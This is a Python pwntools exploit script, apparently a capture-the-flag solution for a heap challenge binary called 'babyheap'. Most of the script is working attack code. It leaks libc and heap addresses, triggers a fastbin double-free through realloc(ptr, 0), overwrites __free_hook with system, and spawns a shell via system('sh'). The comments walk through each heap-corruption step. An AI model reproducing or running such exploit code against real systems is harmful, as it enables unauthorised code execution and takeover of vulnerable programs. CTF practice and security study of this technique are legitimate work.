from pwn import *

def create(size, data):
	r.sendlineafter('>', '1')
	r.sendlineafter(':', str(size))
	if len(data) < size:
		data += '\n'
	r.sendafter(':', data)
	return

def del_team(idx):
	r.sendlineafter('>', '2')
	r.sendlineafter(':', str(idx))
	return

def list_team():
	r.sendlineafter('>', '4')
	return

def manage(idx):
	r.sendlineafter('>', '3')
	r.sendlineafter(':', str(idx))
	return

def add(idx ,num, data = 'kek'):
	manage(idx)
	r.sendlineafter('>', '1')
	r.sendlineafter(':', str(num))

	for i in range(num*2):
		r.sendlineafter(':', data)
	ret2menu()
	return

def del_member(team_idx, mem_idx):
	manage(team_idx)
	r.sendlineafter('>', '2')
	r.sendlineafter(':', str(mem_idx))
	ret2menu()
	return

def edit(team_idx, mem_idx, data):
	manage(team_idx)
	r.sendlineafter('>', '4')
	r.sendlineafter(':', str(mem_idx))
	r.sendlineafter(':', data)
	ret2menu()
	return

def ret2menu():
	r.sendlineafter('>', '5')
	return

def leak(ru):
	list_team()
	r.recvuntil(ru)
	return u64(r.recv(6).ljust(8, '\x00'))

def popshell(team_idx, mem_idx):
	manage(team_idx)
	r.sendlineafter('>', '2')
	r.sendlineafter(':', str(mem_idx))
	return

def pwn():
	
	create(0x10, 'A'*8 + p64(0x21)) # team_0
	# __libc_realloc(0) => __libc_malloc(0)
	# We will use that pointer later to trigger a free via realloc.
	add(0, 0)

	create(0x10, 'B'*8) # team_1
	# Allocate a bunch of chunks. We will need them to
	# leak libc & heap.
	add(1, 2)
	# Prevent top chunk consolidation for future heap leak
	create(0x10, 'C'*8) # team_2
	# Place it in the unsorted bin
	del_member(1, 0)
	# No fastbin is available and malloc will resort to the unsorted bin.
	create(0x8, 'D'*8) # team_3

	libc   = leak('D'*8) - 0x3c4c38
	# Plan is __free_hook => system
	fhook  = libc + 0x3c67a8
	system = libc + 0x45390
	sh     = libc + 0x18cd57
	log.success("Libc:        0x{:x}".format(libc))
	log.success("__free_hook: 0x{:x}".format(fhook))
	
	# Free the pointer to the members array
	# by abusing __libc_realloc(ptr, 0) => __libc_free(ptr)
	add(0, 0)
	# The member array of team_0 is of size 0x20 (with alignment).
	# By creating a new team with a description of size less
	# than or equal to 0x18, we will get back the member array pointer
	# and we will be able to overwrite its entry(ies).
	create(0x10, p64(fhook) + p64(sh)) # team_4
	# Free a couple of fast chunks to form a linked list.
	del_team(3) 
	del_team(2)
	# team_2 --> team_3
	create(0, '') # team_2
	add(2, 0)

	heap = leak('Team 2\nDescription : ') - 0xe0
	log.success("Heap:        0x{:x}".format(heap))

	create(0, '') # team_3
	add(3, 0)

	# Trigger double-free
	add(2, 0)
	add(3, 0)
	add(2, 0)
	# Ovewrite team_2's FD with a chunk close to team_0
	# so that we can overlap, edit the number of members
	# and finally edit its 0th member which is __free_hook.
	create(0x8, p64(heap + 0x20)) # team_5
	add(5, 0)
	# Overlap team_0 and edit its members counter
	# so that we can call edit on it.
	create(0x10, p64(0) + p64(0x6))
	# __free_hook => system
	edit(0, 0, p64(system))
	# __free_hook('sh') => system('sh')
	popshell(0, 1)

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if sys.argv[1] == "r":
        r = remote()
        pwn()
    else:
        r = process('./babyheap')
        pause()
        pwn()
